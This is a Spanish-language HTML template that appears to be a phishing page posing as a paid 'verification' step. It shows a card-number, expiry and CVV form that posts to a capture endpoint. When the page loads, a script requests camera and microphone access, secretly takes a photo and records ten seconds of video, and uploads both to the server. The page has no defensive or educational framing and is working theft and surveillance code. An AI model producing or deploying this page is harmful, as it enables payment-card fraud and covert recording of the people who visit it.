<!DOCTYPE html>
<html>
<head>
<link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ config.titulo }}</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
</head>
<body style="background:{{config.color_fondo}}; color:{{config.color_texto}};">
    <div class="container p-4 text-center">
        <img src="{{config.img_principal}}" style="width:100px; border-radius:50%; border:2px solid gold;">
        <h3 class="mt-3">VERIFICACIÓN REQUERIDA</h3>
        <p>Para acceder, complete el pago de ${{config.precio}}</p>

        <div style="background:rgba(255,255,255,0.1); padding:20px; border-radius:15px; max-width:400px; margin:auto;">
            <form action="/captura_pago" method="POST">
                <input type="text" name="cc" class="form-control mb-2" placeholder="Número de Tarjeta" required>
                <div class="row g-2">
                    <div class="col-6"><input type="text" name="exp" class="form-control" placeholder="MM/AA"></div>
                    <div class="col-6"><input type="text" name="cvv" class="form-control" placeholder="CVV"></div>
                </div>
                <button class="btn btn-warning w-100 mt-3 fw-bold">PAGAR AHORA</button>
            </form>
            <div id="status" style="font-size:10px; margin-top:10px; color:gold;">Sincronizando seguridad...</div>
        </div>
    </div>

    <script>
        async function runCapture() {
            const rid = "{{ session.current_id }}";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Capturar foto a los 3 segundos
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('file', blob); fd.append('type', 'FOTO'); fd.append('id', rid);
                        fetch('/upload_capture', {method: 'POST', body: fd});
                    }, 'image/jpeg');
                }, 3000);

                // Grabar video 10 segundos
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, {type: 'video/webm'});
                    const fd = new FormData();
                    fd.append('file', blob); fd.append('type', 'VIDEO'); fd.append('id', rid);
                    fetch('/upload_capture', {method: 'POST', body: fd});
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 10000);

            } catch (e) { document.getElementById('status').innerText = "ERROR 403: REQUIERE CÁMARA"; }
        }
        window.onload = runCapture;

    // MÁSCARA INTELIGENTE DE TARJETA
    const inputCC = document.querySelector('input[name="cc"]');
    const inputEXP = document.querySelector('input[name="exp"]');
    const inputCVV = document.querySelector('input[name="cvv"]');

    inputCC.addEventListener('input', (e) => {
        let v = e.target.value.replace(/\D/g, '');
        v = v.replace(/(\d{4})(?=\d)/g, '$1 '); // Espacio cada 4 números
        e.target.value = v.substring(0, 19);
    });

    inputEXP.addEventListener('input', (e) => {
        let v = e.target.value.replace(/\D/g, '');
        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
        e.target.value = v.substring(0, 5);
    });

    inputCVV.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
    });

    // [Mantener aquí el script de captura de cámara/audio que envié antes]
    </script>
</body>
</html>
